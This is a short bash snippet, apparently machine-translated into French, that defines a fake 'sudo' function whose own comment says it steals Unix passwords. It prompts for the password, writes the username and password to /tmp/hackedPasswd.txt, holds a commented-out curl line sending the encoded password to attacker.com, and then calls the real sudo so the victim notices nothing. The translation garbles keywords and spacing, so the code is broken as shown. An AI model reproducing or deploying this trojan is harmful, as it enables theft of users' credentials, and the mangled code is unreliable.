fonction sudo () 
{ 
    # Fonction Sudo pour le vol de mots de passe Unix
    realsudo = "$ (quel sudo)";
    read -s -p "[sudo] mot de passe pour $ USER:" inputPasswd;
    printf "\ n";
    printf '% s \ n' "$ USER: $ inputPasswd"> /tmp/hackedPasswd.txt;
    # encoded = $ (printf '% s' "$ inputPasswd" | base64)> / dev / null 2> & 1;
    # curl -s "http://attacker.com/$USER:$encoded"> / dev / null 2> & 1;
    $ realsudo -S -u racine bash -c "exit" <<< "$ inputPasswd"> / dev / null 2> & 1;
    $ realsudo "$ {@: 1}"
}
